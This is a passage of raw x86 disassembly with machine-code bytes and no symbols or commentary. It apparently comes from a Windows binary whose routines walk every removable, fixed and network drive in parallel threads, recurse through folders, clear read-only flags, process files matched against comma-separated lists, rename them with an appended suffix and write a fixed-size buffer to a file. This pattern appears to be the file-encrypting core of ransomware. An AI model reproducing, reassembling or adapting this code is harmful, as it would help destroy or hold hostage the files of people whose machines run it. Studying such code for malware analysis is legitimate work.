  4096a2:	ff 15 2c 10 40 00    	call   *0x40102c
  4096a8:	03 c0                	add    %eax,%eax
  4096aa:	50                   	push   %eax
  4096ab:	ff b4 24 20 10 00 00 	push   0x1020(%esp)
  4096b2:	6a 01                	push   $0x1
  4096b4:	56                   	push   %esi
  4096b5:	55                   	push   %ebp
  4096b6:	ff 74 24 24          	push   0x24(%esp)
  4096ba:	ff 15 1c 10 40 00    	call   *0x40101c
  4096c0:	ff 74 24 10          	push   0x10(%esp)
  4096c4:	ff 15 0c 10 40 00    	call   *0x40100c
  4096ca:	5d                   	pop    %ebp
  4096cb:	5f                   	pop    %edi
  4096cc:	5e                   	pop    %esi
  4096cd:	5b                   	pop    %ebx
  4096ce:	81 c4 08 10 00 00    	add    $0x1008,%esp
  4096d4:	c2 04 00             	ret    $0x4
  4096d7:	b8 a0 25 00 00       	mov    $0x25a0,%eax
  4096dc:	e8 f9 0c 00 00       	call   0x40a3da
  4096e1:	53                   	push   %ebx
  4096e2:	8d 84 24 64 02 00 00 	lea    0x264(%esp),%eax
  4096e9:	50                   	push   %eax
  4096ea:	e8 3a cd ff ff       	call   0x406429
  4096ef:	8d 84 24 a4 03 00 00 	lea    0x3a4(%esp),%eax
  4096f6:	50                   	push   %eax
  4096f7:	e8 5a d2 ff ff       	call   0x406956
  4096fc:	33 db                	xor    %ebx,%ebx
  4096fe:	8d 84 24 a4 03 00 00 	lea    0x3a4(%esp),%eax
  409705:	53                   	push   %ebx
  409706:	53                   	push   %ebx
  409707:	50                   	push   %eax
  409708:	68 e5 69 40 00       	push   $0x4069e5
  40970d:	8d 84 24 74 02 00 00 	lea    0x274(%esp),%eax
  409714:	50                   	push   %eax
  409715:	e8 25 cd ff ff       	call   0x40643f
  40971a:	85 c0                	test   %eax,%eax
  40971c:	74 08                	je     0x409726
  40971e:	33 c0                	xor    %eax,%eax
  409720:	40                   	inc    %eax
  409721:	e9 5f 02 00 00       	jmp    0x409985
  409726:	8b 84 24 a8 25 00 00 	mov    0x25a8(%esp),%eax
  40972d:	53                   	push   %ebx
  40972e:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  409732:	8b 48 04             	mov    0x4(%eax),%ecx
  409735:	ff 30                	push   (%eax)
  409737:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40973b:	8b 48 08             	mov    0x8(%eax),%ecx
  40973e:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  409742:	e8 ad fc ff ff       	call   0x4093f4
  409747:	50                   	push   %eax
  409748:	8d 44 24 08          	lea    0x8(%esp),%eax
  40974c:	50                   	push   %eax
  40974d:	e8 cf 0b 00 00       	call   0x40a321
  409752:	8d 44 24 04          	lea    0x4(%esp),%eax
  409756:	50                   	push   %eax
  409757:	e8 31 0c 00 00       	call   0x40a38d
  40975c:	85 c0                	test   %eax,%eax
  40975e:	0f 85 05 02 00 00    	jne    0x409969
  409764:	8b 1d 70 10 40 00    	mov    0x401070,%ebx
  40976a:	55                   	push   %ebp
  40976b:	56                   	push   %esi
  40976c:	8b 35 64 10 40 00    	mov    0x401064,%esi
  409772:	57                   	push   %edi
  409773:	8d 84 24 b0 05 00 00 	lea    0x5b0(%esp),%eax
  40977a:	50                   	push   %eax
  40977b:	8d 44 24 14          	lea    0x14(%esp),%eax
  40977f:	50                   	push   %eax
  409780:	e8 d1 0b 00 00       	call   0x40a356
  409785:	8d 84 24 b0 05 00 00 	lea    0x5b0(%esp),%eax
  40978c:	50                   	push   %eax
  40978d:	ff 15 2c 10 40 00    	call   *0x40102c
  409793:	8b f8                	mov    %eax,%edi
  409795:	8d 84 24 b0 05 00 00 	lea    0x5b0(%esp),%eax
  40979c:	68 d4 20 40 00       	push   $0x4020d4
  4097a1:	50                   	push   %eax
  4097a2:	89 7c 24 20          	mov    %edi,0x20(%esp)
  4097a6:	ff d3                	call   *%ebx
  4097a8:	8d 44 24 20          	lea    0x20(%esp),%eax
  4097ac:	50                   	push   %eax
  4097ad:	8d 84 24 b4 05 00 00 	lea    0x5b4(%esp),%eax
  4097b4:	50                   	push   %eax
  4097b5:	ff 15 94 10 40 00    	call   *0x401094
  4097bb:	8b e8                	mov    %eax,%ebp
  4097bd:	83 fd ff             	cmp    $0xffffffff,%ebp
  4097c0:	0f 84 8e 01 00 00    	je     0x409954
  4097c6:	68 d8 20 40 00       	push   $0x4020d8
  4097cb:	8d 44 24 50          	lea    0x50(%esp),%eax
  4097cf:	50                   	push   %eax
  4097d0:	ff d6                	call   *%esi
  4097d2:	85 c0                	test   %eax,%eax
  4097d4:	0f 84 5f 01 00 00    	je     0x409939
  4097da:	68 dc 20 40 00       	push   $0x4020dc
  4097df:	8d 44 24 50          	lea    0x50(%esp),%eax
  4097e3:	50                   	push   %eax
  4097e4:	ff d6                	call   *%esi
  4097e6:	85 c0                	test   %eax,%eax
  4097e8:	0f 84 4b 01 00 00    	je     0x409939
  4097ee:	33 c0                	xor    %eax,%eax
  4097f0:	66 89 84 7c b0 05 00 	mov    %ax,0x5b0(%esp,%edi,2)
  4097f7:	00 
  4097f8:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  4097fc:	50                   	push   %eax
  4097fd:	8d 84 24 b4 05 00 00 	lea    0x5b4(%esp),%eax
  409804:	50                   	push   %eax
  409805:	ff d3                	call   *%ebx
  409807:	6a 00                	push   $0x0
  409809:	8d 44 24 50          	lea    0x50(%esp),%eax
  40980d:	50                   	push   %eax
  40980e:	e8 a0 fc ff ff       	call   0x4094b3
  409813:	f6 44 24 20 10       	testb  $0x10,0x20(%esp)
  409818:	8b f8                	mov    %eax,%edi
  40981a:	74 36                	je     0x409852
  40981c:	6a 00                	push   $0x0
  40981e:	57                   	push   %edi
  40981f:	e8 07 fa ff ff       	call   0x40922b
  409824:	85 c0                	test   %eax,%eax
  409826:	0f 85 02 01 00 00    	jne    0x40992e
  40982c:	68 e4 20 40 00       	push   $0x4020e4
  409831:	8d 84 24 b4 05 00 00 	lea    0x5b4(%esp),%eax
  409838:	50                   	push   %eax
  409839:	ff d3                	call   *%ebx
  40983b:	8d 84 24 b0 05 00 00 	lea    0x5b0(%esp),%eax
  409842:	50                   	push   %eax
  409843:	8d 44 24 14          	lea    0x14(%esp),%eax
  409847:	50                   	push   %eax
  409848:	e8 d4 0a 00 00       	call   0x40a321
  40984d:	e9 dc 00 00 00       	jmp    0x40992e
  409852:	6a 01                	push   $0x1
  409854:	57                   	push   %edi
  409855:	e8 d1 f9 ff ff       	call   0x40922b
  40985a:	85 c0                	test   %eax,%eax
  40985c:	0f 85 cc 00 00 00    	jne    0x40992e
  409862:	ff 35 b0 ca 40 00    	push   0x40cab0
  409868:	8d 44 24 50          	lea    0x50(%esp),%eax
  40986c:	50                   	push   %eax
  40986d:	ff d6                	call   *%esi
  40986f:	85 c0                	test   %eax,%eax
  409871:	0f 84 b7 00 00 00    	je     0x40992e
  409877:	ff 35 ac ca 40 00    	push   0x40caac
  40987d:	8d 44 24 50          	lea    0x50(%esp),%eax
  409881:	50                   	push   %eax
  409882:	ff d6                	call   *%esi
  409884:	85 c0                	test   %eax,%eax
  409886:	0f 84 a2 00 00 00    	je     0x40992e
  40988c:	ff 35 a8 ca 40 00    	push   0x40caa8
  409892:	ff 15 e8 10 40 00    	call   *0x4010e8
  409898:	50                   	push   %eax
  409899:	8d 44 24 50          	lea    0x50(%esp),%eax
  40989d:	50                   	push   %eax
  40989e:	ff d6                	call   *%esi
  4098a0:	85 c0                	test   %eax,%eax
  4098a2:	0f 84 86 00 00 00    	je     0x40992e
  4098a8:	8b 44 24 20          	mov    0x20(%esp),%eax
  4098ac:	a8 01                	test   $0x1,%al
  4098ae:	74 12                	je     0x4098c2
  4098b0:	83 e0 fe             	and    $0xfffffffe,%eax
  4098b3:	50                   	push   %eax
  4098b4:	8d 84 24 b4 05 00 00 	lea    0x5b4(%esp),%eax
  4098bb:	50                   	push   %eax
  4098bc:	ff 15 8c 10 40 00    	call   *0x40108c
  4098c2:	8d 84 24 70 02 00 00 	lea    0x270(%esp),%eax
  4098c9:	50                   	push   %eax
  4098ca:	ff 74 24 20          	push   0x20(%esp)
  4098ce:	8d 84 24 b8 05 00 00 	lea    0x5b8(%esp),%eax
  4098d5:	ff 74 24 1c          	push   0x1c(%esp)
  4098d9:	50                   	push   %eax
  4098da:	e8 98 f4 ff ff       	call   0x408d77
  4098df:	85 c0                	test   %eax,%eax
  4098e1:	75 4b                	jne    0x40992e
  4098e3:	8d 84 24 b0 05 00 00 	lea    0x5b0(%esp),%eax
  4098ea:	50                   	push   %eax
  4098eb:	8d 84 24 b4 15 00 00 	lea    0x15b4(%esp),%eax
  4098f2:	50                   	push   %eax
  4098f3:	ff 15 d0 10 40 00    	call   *0x4010d0
  4098f9:	ff 35 98 ca 40 00    	push   0x40ca98
  4098ff:	8d 84 24 b4 15 00 00 	lea    0x15b4(%esp),%eax
  409906:	50                   	push   %eax
  409907:	ff d3                	call   *%ebx
  409909:	6a 01                	push   $0x1
  40990b:	8d 84 24 b4 15 00 00 	lea    0x15b4(%esp),%eax
  409912:	50                   	push   %eax
  409913:	8d 84 24 b8 05 00 00 	lea    0x5b8(%esp),%eax
  40991a:	50                   	push   %eax
  40991b:	ff 15 a0 10 40 00    	call   *0x4010a0
  409921:	8d 84 24 b0 05 00 00 	lea    0x5b0(%esp),%eax
  409928:	50                   	push   %eax
  409929:	e8 1c fa ff ff       	call   0x40934a
  40992e:	57                   	push   %edi
  40992f:	e8 31 8e ff ff       	call   0x402765
  409934:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  409938:	59                   	pop    %ecx
  409939:	8d 44 24 20          	lea    0x20(%esp),%eax
  40993d:	50                   	push   %eax
  40993e:	55                   	push   %ebp
  40993f:	ff 15 98 10 40 00    	call   *0x401098
  409945:	85 c0                	test   %eax,%eax
  409947:	0f 85 79 fe ff ff    	jne    0x4097c6
  40994d:	55                   	push   %ebp
  40994e:	ff 15 5c 10 40 00    	call   *0x40105c
  409954:	8d 44 24 10          	lea    0x10(%esp),%eax
  409958:	50                   	push   %eax
  409959:	e8 2f 0a 00 00       	call   0x40a38d
  40995e:	85 c0                	test   %eax,%eax
  409960:	0f 84 0d fe ff ff    	je     0x409773
  409966:	5f                   	pop    %edi
  409967:	5e                   	pop    %esi
  409968:	5d                   	pop    %ebp
  409969:	8d 84 24 64 02 00 00 	lea    0x264(%esp),%eax
  409970:	50                   	push   %eax
  409971:	e8 e6 ca ff ff       	call   0x40645c
  409976:	8d 84 24 a4 03 00 00 	lea    0x3a4(%esp),%eax
  40997d:	50                   	push   %eax
  40997e:	e8 08 d0 ff ff       	call   0x40698b
  409983:	33 c0                	xor    %eax,%eax
  409985:	5b                   	pop    %ebx
  409986:	81 c4 a0 25 00 00    	add    $0x25a0,%esp
  40998c:	c2 04 00             	ret    $0x4
  40998f:	81 ec 70 08 00 00    	sub    $0x870,%esp
  409995:	53                   	push   %ebx
  409996:	55                   	push   %ebp
  409997:	56                   	push   %esi
  409998:	57                   	push   %edi
  409999:	8b 3d c4 10 40 00    	mov    0x4010c4,%edi
  40999f:	6a 70                	push   $0x70
  4099a1:	6a 00                	push   $0x0
  4099a3:	ff d7                	call   *%edi
  4099a5:	50                   	push   %eax
  4099a6:	ff 15 d4 10 40 00    	call   *0x4010d4
  4099ac:	8b e8                	mov    %eax,%ebp
  4099ae:	ff 15 54 10 40 00    	call   *0x401054
  4099b4:	68 fc 07 00 00       	push   $0x7fc
  4099b9:	8b d8                	mov    %eax,%ebx
  4099bb:	c7 84 24 84 00 00 00 	movl   $0x5c3a41,0x84(%esp)
  4099c2:	41 3a 5c 00 
  4099c6:	33 f6                	xor    %esi,%esi
  4099c8:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  4099cf:	56                   	push   %esi
  4099d0:	50                   	push   %eax
  4099d1:	e8 71 8c ff ff       	call   0x402647
  4099d6:	83 c4 0c             	add    $0xc,%esp
  4099d9:	85 db                	test   %ebx,%ebx
  4099db:	74 56                	je     0x409a33
  4099dd:	f6 c3 01             	test   $0x1,%bl
  4099e0:	74 46                	je     0x409a28
  4099e2:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  4099e9:	50                   	push   %eax
  4099ea:	ff 15 80 10 40 00    	call   *0x401080
  4099f0:	83 f8 03             	cmp    $0x3,%eax
  4099f3:	74 0a                	je     0x4099ff
  4099f5:	83 f8 02             	cmp    $0x2,%eax
  4099f8:	74 05                	je     0x4099ff
  4099fa:	83 f8 04             	cmp    $0x4,%eax
  4099fd:	75 29                	jne    0x409a28
  4099ff:	6a 03                	push   $0x3
  409a01:	6a 00                	push   $0x0
  409a03:	c6 84 24 8b 00 00 00 	movb   $0x0,0x8b(%esp)
  409a0a:	00 
  409a0b:	ff d7                	call   *%edi
  409a0d:	50                   	push   %eax
  409a0e:	ff 15 d4 10 40 00    	call   *0x4010d4
  409a14:	8d 8c 24 80 00 00 00 	lea    0x80(%esp),%ecx
  409a1b:	89 44 b5 00          	mov    %eax,0x0(%ebp,%esi,4)
  409a1f:	51                   	push   %ecx
  409a20:	50                   	push   %eax
  409a21:	ff 15 68 10 40 00    	call   *0x401068
  409a27:	46                   	inc    %esi
  409a28:	fe 84 24 80 00 00 00 	incb   0x80(%esp)
  409a2f:	d1 eb                	shr    $1,%ebx
  409a31:	75 aa                	jne    0x4099dd
  409a33:	33 ff                	xor    %edi,%edi
  409a35:	85 f6                	test   %esi,%esi
  409a37:	7e 55                	jle    0x409a8e
  409a39:	8b 9c 24 88 08 00 00 	mov    0x888(%esp),%ebx
  409a40:	8d 44 24 10          	lea    0x10(%esp),%eax
  409a44:	2b e8                	sub    %eax,%ebp
  409a46:	6a 0c                	push   $0xc
  409a48:	6a 00                	push   $0x0
  409a4a:	ff 15 c4 10 40 00    	call   *0x4010c4
  409a50:	50                   	push   %eax
  409a51:	ff 15 d4 10 40 00    	call   *0x4010d4
  409a57:	8b 8c 24 84 08 00 00 	mov    0x884(%esp),%ecx
  409a5e:	89 48 04             	mov    %ecx,0x4(%eax)
  409a61:	8d 0c bd 00 00 00 00 	lea    0x0(,%edi,4),%ecx
  409a68:	03 cd                	add    %ebp,%ecx
  409a6a:	89 58 08             	mov    %ebx,0x8(%eax)
  409a6d:	8b 4c 0c 10          	mov    0x10(%esp,%ecx,1),%ecx
  409a71:	89 08                	mov    %ecx,(%eax)
  409a73:	33 c9                	xor    %ecx,%ecx
  409a75:	51                   	push   %ecx
  409a76:	51                   	push   %ecx
  409a77:	50                   	push   %eax
  409a78:	68 d7 96 40 00       	push   $0x4096d7
  409a7d:	51                   	push   %ecx
  409a7e:	51                   	push   %ecx
  409a7f:	ff 15 40 10 40 00    	call   *0x401040
  409a85:	89 44 bc 10          	mov    %eax,0x10(%esp,%edi,4)
  409a89:	47                   	inc    %edi
  409a8a:	3b fe                	cmp    %esi,%edi
  409a8c:	7c b8                	jl     0x409a46
  409a8e:	6a ff                	push   $0xffffffff
  409a90:	6a 01                	push   $0x1
  409a92:	8d 44 24 18          	lea    0x18(%esp),%eax
  409a96:	50                   	push   %eax
  409a97:	56                   	push   %esi
  409a98:	ff 15 4c 10 40 00    	call   *0x40104c
  409a9e:	5f                   	pop    %edi
  409a9f:	5e                   	pop    %esi
  409aa0:	5d                   	pop    %ebp
  409aa1:	5b                   	pop    %ebx
  409aa2:	81 c4 70 08 00 00    	add    $0x870,%esp
  409aa8:	c2 08 00             	ret    $0x8
  409aab:	53                   	push   %ebx
  409aac:	55                   	push   %ebp
  409aad:	56                   	push   %esi
  409aae:	57                   	push   %edi
  409aaf:	8b 7c 24 14          	mov    0x14(%esp),%edi
  409ab3:	33 ed                	xor    %ebp,%ebp
  409ab5:	55                   	push   %ebp
  409ab6:	6a 20                	push   $0x20
  409ab8:	ff 74 24 24          	push   0x24(%esp)
  409abc:	ff 74 24 2c          	push   0x2c(%esp)
  409ac0:	57                   	push   %edi
  409ac1:	e8 3f f0 ff ff       	call   0x408b05
  409ac6:	57                   	push   %edi
  409ac7:	8b f5                	mov    %ebp,%esi
  409ac9:	ff 15 c0 10 40 00    	call   *0x4010c0
  409acf:	8b cd                	mov    %ebp,%ecx
  409ad1:	85 c0                	test   %eax,%eax
  409ad3:	7e 0c                	jle    0x409ae1
  409ad5:	80 3c 39 2c          	cmpb   $0x2c,(%ecx,%edi,1)
  409ad9:	75 01                	jne    0x409adc
  409adb:	46                   	inc    %esi
  409adc:	41                   	inc    %ecx
  409add:	3b c8                	cmp    %eax,%ecx
  409adf:	7c f4                	jl     0x409ad5
  409ae1:	55                   	push   %ebp
  409ae2:	68 00 10 00 00       	push   $0x1000
  409ae7:	55                   	push   %ebp
  409ae8:	46                   	inc    %esi
  409ae9:	ff 15 34 10 40 00    	call   *0x401034
  409aef:	8b ce                	mov    %esi,%ecx
  409af1:	c1 e1 02             	shl    $0x2,%ecx
  409af4:	51                   	push   %ecx
  409af5:	55                   	push   %ebp
  409af6:	50                   	push   %eax
  409af7:	ff 15 d4 10 40 00    	call   *0x4010d4
  409afd:	68 e8 20 40 00       	push   $0x4020e8
  409b02:	57                   	push   %edi
  409b03:	8b d8                	mov    %eax,%ebx
  409b05:	e8 a8 8b ff ff       	call   0x4026b2
  409b0a:	59                   	pop    %ecx
  409b0b:	59                   	pop    %ecx
  409b0c:	85 c0                	test   %eax,%eax
  409b0e:	74 18                	je     0x409b28
  409b10:	8b fb                	mov    %ebx,%edi
  409b12:	68 ec 20 40 00       	push   $0x4020ec
  409b17:	55                   	push   %ebp
  409b18:	89 07                	mov    %eax,(%edi)
  409b1a:	e8 93 8b ff ff       	call   0x4026b2
  409b1f:	8d 7f 04             	lea    0x4(%edi),%edi
  409b22:	59                   	pop    %ecx
  409b23:	59                   	pop    %ecx
  409b24:	85 c0                	test   %eax,%eax
  409b26:	75 ea                	jne    0x409b12
  409b28:	8b 44 24 18          	mov    0x18(%esp),%eax
  409b2c:	5f                   	pop    %edi
  409b2d:	89 30                	mov    %esi,(%eax)
  409b2f:	8b c3                	mov    %ebx,%eax
  409b31:	5e                   	pop    %esi
  409b32:	5d                   	pop    %ebp
  409b33:	5b                   	pop    %ebx
  409b34:	c2 10 00             	ret    $0x10
  409b37:	51                   	push   %ecx
  409b38:	51                   	push   %ecx
  409b39:	53                   	push   %ebx
  409b3a:	55                   	push   %ebp
  409b3b:	33 ed                	xor    %ebp,%ebp
  409b3d:	55                   	push   %ebp
  409b3e:	68 80 00 00 00       	push   $0x80
  409b43:	6a 04                	push   $0x4
  409b45:	55                   	push   %ebp
  409b46:	55                   	push   %ebp
  409b47:	68 00 00 00 c0       	push   $0xc0000000
  409b4c:	ff 74 24 2c          	push   0x2c(%esp)
  409b50:	ff 15 30 10 40 00    	call   *0x401030
  409b56:	8b d8                	mov    %eax,%ebx
  409b58:	83 fb ff             	cmp    $0xffffffff,%ebx
  409b5b:	75 0b                	jne    0x409b68
  409b5d:	ff 15 bc 10 40 00    	call   *0x4010bc
  409b63:	e9 e8 00 00 00       	jmp    0x409c50
  409b68:	56                   	push   %esi
  409b69:	8b 35 bc 10 40 00    	mov    0x4010bc,%esi
  409b6f:	57                   	push   %edi
  409b70:	ff d6                	call   *%esi
  409b72:	8b f8                	mov    %eax,%edi
  409b74:	85 ff                	test   %edi,%edi
  409b76:	75 68                	jne    0x409be0
  409b78:	68 00 04 00 00       	push   $0x400
  409b7d:	e8 f7 8b ff ff       	call   0x402779
  409b82:	59                   	pop    %ecx
  409b83:	53                   	push   %ebx
  409b84:	68 e8 17 40 00       	push   $0x4017e8
  409b89:	68 b8 17 40 00       	push   $0x4017b8
  409b8e:	ff 35 a4 ca 40 00    	push   0x40caa4
  409b94:	8b f0                	mov    %eax,%esi
  409b96:	ff 74 24 2c          	push   0x2c(%esp)
  409b9a:	ff 35 20 11 40 00    	push   0x401120
  409ba0:	68 48 11 40 00       	push   $0x401148
  409ba5:	56                   	push   %esi
  409ba6:	e8 57 05 00 00       	call   0x40a102
  409bab:	bd 40 c6 40 00       	mov    $0x40c640,%ebp
  409bb0:	55                   	push   %ebp
  409bb1:	56                   	push   %esi
  409bb2:	e8 05 8c ff ff       	call   0x4027bc
  409bb7:	56                   	push   %esi
  409bb8:	e8 a8 8b ff ff       	call   0x402765
  409bbd:	59                   	pop    %ecx
  409bbe:	6a 02                	push   $0x2
  409bc0:	33 f6                	xor    %esi,%esi
  409bc2:	56                   	push   %esi
  409bc3:	56                   	push   %esi
  409bc4:	53                   	push   %ebx
  409bc5:	ff 15 58 10 40 00    	call   *0x401058
  409bcb:	56                   	push   %esi
  409bcc:	8d 44 24 18          	lea    0x18(%esp),%eax
  409bd0:	50                   	push   %eax
  409bd1:	68 00 03 00 00       	push   $0x300
  409bd6:	55                   	push   %ebp
  409bd7:	53                   	push   %ebx
  409bd8:	ff 15 b4 10 40 00    	call   *0x4010b4
  409bde:	eb 65                	jmp    0x409c45
  409be0:	81 ff b7 00 00 00    	cmp    $0xb7,%edi
  409be6:	75 5d                	jne    0x409c45
  409be8:	8b 3d 6c 10 40 00    	mov    0x40106c,%edi
  409bee:	8d 44 24 10          	lea    0x10(%esp),%eax
  409bf2:	55                   	push   %ebp
  409bf3:	50                   	push   %eax
  409bf4:	68 00 01 00 00       	push   $0x100
  409bf9:	ff 35 a4 ca 40 00    	push   0x40caa4
  409bff:	53                   	push   %ebx
  409c00:	ff d7                	call   *%edi
  409c02:	85 c0                	test   %eax,%eax
  409c04:	74 3b                	je     0x409c41
  409c06:	81 7c 24 10 00 01 00 	cmpl   $0x100,0x10(%esp)
  409c0d:	00 
  409c0e:	75 31                	jne    0x409c41
  409c10:	6a 01                	push   $0x1
  409c12:	55                   	push   %ebp
  409c13:	6a 02                	push   $0x2
  409c15:	53                   	push   %ebx
  409c16:	ff 15 58 10 40 00    	call   *0x401058
  409c1c:	55                   	push   %ebp
  409c1d:	8d 44 24 14          	lea    0x14(%esp),%eax
  409c21:	50                   	push   %eax
  409c22:	68 00 03 00 00       	push   $0x300
  409c27:	68 40 c6 40 00       	push   $0x40c640
  409c2c:	53                   	push   %ebx
  409c2d:	ff d7                	call   *%edi
  409c2f:	85 c0                	test   %eax,%eax
  409c31:	74 0e                	je     0x409c41
  409c33:	81 7c 24 10 00 03 00 	cmpl   $0x300,0x10(%esp)
  409c3a:	00 
  409c3b:	75 04                	jne    0x409c41
  409c3d:	8b fd                	mov    %ebp,%edi
  409c3f:	eb 04                	jmp    0x409c45
  409c41:	ff d6                	call   *%esi
  409c43:	8b f8                	mov    %eax,%edi
  409c45:	53                   	push   %ebx
  409c46:	ff 15 28 10 40 00    	call   *0x401028
  409c4c:	8b c7                	mov    %edi,%eax
  409c4e:	5f                   	pop    %edi
  409c4f:	5e                   	pop    %esi
  409c50:	5d                   	pop    %ebp
  409c51:	5b                   	pop    %ebx
  409c52:	59                   	pop    %ecx
  409c53:	59                   	pop    %ecx
  409c54:	c2 04 00             	ret    $0x4
  409c57:	53                   	push   %ebx
  409c58:	55                   	push   %ebp
  409c59:	56                   	push   %esi
  409c5a:	57                   	push   %edi
  409c5b:	33 ff                	xor    %edi,%edi
  409c5d:	be 48 11 40 00       	mov    $0x401148,%esi
  409c62:	57                   	push   %edi
  409c63:	6a 20                	push   $0x20
  409c65:	68 24 11 40 00       	push   $0x401124
  409c6a:	68 10 02 00 00       	push   $0x210
  409c6f:	56                   	push   %esi
  409c70:	e8 90 ee ff ff       	call   0x408b05
  409c75:	6a 20                	push   $0x20
  409c77:	e8 fd 8a ff ff       	call   0x402779
  409c7c:	59                   	pop    %ecx
  409c7d:	57                   	push   %edi
  409c7e:	50                   	push   %eax
  409c7f:	68 00 02 00 00       	push   $0x200
  409c84:	56                   	push   %esi
  409c85:	a3 8c ca 40 00       	mov    %eax,0x40ca8c
  409c8a:	e8 65 ec ff ff       	call   0x4088f4
  409c8f:	bb 00 10 00 00       	mov    $0x1000,%ebx
  409c94:	53                   	push   %ebx
  409c95:	ff 35 a8 ca 40 00    	push   0x40caa8
  409c9b:	e8 ed 8a ff ff       	call   0x40278d
  409ca0:	be b4 09 00 00       	mov    $0x9b4,%esi
  409ca5:	a3 a8 ca 40 00       	mov    %eax,0x40caa8
  409caa:	56                   	push   %esi
  409cab:	ff 35 a4 ca 40 00    	push   0x40caa4
  409cb1:	e8 d7 8a ff ff       	call   0x40278d
  409cb6:	56                   	push   %esi
  409cb7:	57                   	push   %edi
  409cb8:	50                   	push   %eax
  409cb9:	a3 a4 ca 40 00       	mov    %eax,0x40caa4
  409cbe:	e8 84 89 ff ff       	call   0x402647
  409cc3:	83 c4 1c             	add    $0x1c,%esp
  409cc6:	bd 00 08 00 00       	mov    $0x800,%ebp
  409ccb:	55                   	push   %ebp
  409ccc:	ff 35 a8 ca 40 00    	push   0x40caa8
  409cd2:	57                   	push   %edi
  409cd3:	ff 15 74 10 40 00    	call   *0x401074
  409cd9:	57                   	push   %edi
  409cda:	6a 20                	push   $0x20
  409cdc:	ff 35 8c ca 40 00    	push   0x40ca8c
  409ce2:	be b8 17 40 00       	mov    $0x4017b8,%esi
  409ce7:	6a 30                	push   $0x30
  409ce9:	56                   	push   %esi
  409cea:	e8 16 ee ff ff       	call   0x408b05
  409cef:	57                   	push   %edi
  409cf0:	6a 20                	push   $0x20
  409cf2:	ff 35 8c ca 40 00    	push   0x40ca8c
  409cf8:	6a 30                	push   $0x30
  409cfa:	68 e8 17 40 00       	push   $0x4017e8
  409cff:	e8 01 ee ff ff       	call   0x408b05
  409d04:	57                   	push   %edi
  409d05:	56                   	push   %esi
  409d06:	e8 e9 f6 ff ff       	call   0x4093f4
  409d0b:	68 90 02 00 00       	push   $0x290
  409d10:	ff 35 8c ca 40 00    	push   0x40ca8c
  409d16:	a3 98 ca 40 00       	mov    %eax,0x40ca98
  409d1b:	68 9c ca 40 00       	push   $0x40ca9c
  409d20:	68 28 15 40 00       	push   $0x401528
  409d25:	e8 81 fd ff ff       	call   0x409aab
  409d2a:	68 10 01 00 00       	push   $0x110
  409d2f:	ff 35 8c ca 40 00    	push   0x40ca8c
  409d35:	a3 a0 ca 40 00       	mov    %eax,0x40caa0
  409d3a:	68 38 c6 40 00       	push   $0x40c638
  409d3f:	68 18 18 40 00       	push   $0x401818
  409d44:	e8 62 fd ff ff       	call   0x409aab
  409d49:	53                   	push   %ebx
  409d4a:	a3 b4 ca 40 00       	mov    %eax,0x40cab4
  409d4f:	e8 25 8a ff ff       	call   0x402779
  409d54:	8b 1d 7c 10 40 00    	mov    0x40107c,%ebx
  409d5a:	8b f0                	mov    %eax,%esi
  409d5c:	59                   	pop    %ecx
  409d5d:	55                   	push   %ebp
  409d5e:	56                   	push   %esi
  409d5f:	68 f0 20 40 00       	push   $0x4020f0
  409d64:	ff d3                	call   *%ebx
  409d66:	85 c0                	test   %eax,%eax
  409d68:	75 14                	jne    0x409d7e
  409d6a:	55                   	push   %ebp
  409d6b:	56                   	push   %esi
  409d6c:	68 0c 21 40 00       	push   $0x40210c
  409d71:	ff d3                	call   *%ebx
  409d73:	85 c0                	test   %eax,%eax
  409d75:	75 07                	jne    0x409d7e
  409d77:	57                   	push   %edi
  409d78:	ff 15 3c 10 40 00    	call   *0x40103c
  409d7e:	8b 2d f0 10 40 00    	mov    0x4010f0,%ebp
  409d84:	56                   	push   %esi
  409d85:	ff d5                	call   *%ebp
  409d87:	ff 35 a8 ca 40 00    	push   0x40caa8
  409d8d:	ff 15 e8 10 40 00    	call   *0x4010e8
  409d93:	50                   	push   %eax
  409d94:	56                   	push   %esi
  409d95:	ff 15 70 10 40 00    	call   *0x401070
  409d9b:	56                   	push   %esi
  409d9c:	ff 35 a8 ca 40 00    	push   0x40caa8
  409da2:	ff 15 64 10 40 00    	call   *0x401064
  409da8:	56                   	push   %esi
  409da9:	85 c0                	test   %eax,%eax
  409dab:	74 1c                	je     0x409dc9
  409dad:	e8 81 f5 ff ff       	call   0x409333
  409db2:	85 c0                	test   %eax,%eax
  409db4:	75 12                	jne    0x409dc8
  409db6:	57                   	push   %edi
  409db7:	56                   	push   %esi
  409db8:	ff 35 a8 ca 40 00    	push   0x40caa8
  409dbe:	ff 15 9c 10 40 00    	call   *0x40109c
  409dc4:	85 c0                	test   %eax,%eax
  409dc6:	74 06                	je     0x409dce
  409dc8:	56                   	push   %esi
  409dc9:	e8 42 f8 ff ff       	call   0x409610
  409dce:	68 00 10 00 00       	push   $0x1000
  409dd3:	e8 a1 89 ff ff       	call   0x402779
  409dd8:	59                   	pop    %ecx
  409dd9:	be 00 08 00 00       	mov    $0x800,%esi
  409dde:	8b f8                	mov    %eax,%edi
  409de0:	56                   	push   %esi
  409de1:	57                   	push   %edi
  409de2:	68 1c 21 40 00       	push   $0x40211c
  409de7:	ff d3                	call   *%ebx
  409de9:	85 c0                	test   %eax,%eax
  409deb:	75 13                	jne    0x409e00
  409ded:	56                   	push   %esi
  409dee:	57                   	push   %edi
  409def:	68 2c 21 40 00       	push   $0x40212c
  409df4:	ff d3                	call   *%ebx
  409df6:	85 c0                	test   %eax,%eax
  409df8:	75 06                	jne    0x409e00
  409dfa:	50                   	push   %eax
  409dfb:	e9 78 ff ff ff       	jmp    0x409d78
  409e00:	68 98 00 00 00       	push   $0x98
  409e05:	ff 35 b0 ca 40 00    	push   0x40cab0
  409e0b:	e8 7d 89 ff ff       	call   0x40278d
  409e10:	6a 40                	push   $0x40
  409e12:	ff 35 ac ca 40 00    	push   0x40caac
  409e18:	a3 b0 ca 40 00       	mov    %eax,0x40cab0
  409e1d:	e8 6b 89 ff ff       	call   0x40278d
  409e22:	83 c4 10             	add    $0x10,%esp
  409e25:	a3 ac ca 40 00       	mov    %eax,0x40caac
  409e2a:	6a 00                	push   $0x0
  409e2c:	6a 20                	push   $0x20
